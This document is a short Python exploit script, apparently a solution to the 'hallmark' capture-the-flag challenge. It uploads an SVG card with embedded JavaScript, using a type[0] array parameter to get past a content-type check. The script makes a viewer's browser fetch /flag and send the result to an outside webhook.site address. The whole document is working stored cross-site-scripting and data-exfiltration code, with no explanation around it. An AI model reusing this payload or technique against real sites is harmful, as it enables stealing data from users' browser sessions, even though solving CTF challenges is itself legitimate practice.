import requests

payload = """
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      <script>  
        fetch("/flag").then(resp =>
            resp.text().then(s =>
                fetch("https://webhook.site/f571aae8-deda-4a42-84ba-6a77b106aab1/?flag=" + s)
            )
        )
        </script>
   </script>
</svg>
"""
url = "https://hallmark.web.actf.co"

p = requests.post(url+"/card", data={
    "svg":"text",
    "content":"asdf"
})

i = p.url.split("=")[1]

print(i)

p = requests.put(url+"/card", data={
    "id":i,
    "type[0]":"image/svg+xml",
    "content":payload
})

p = requests.get(url+"/card?id="+i)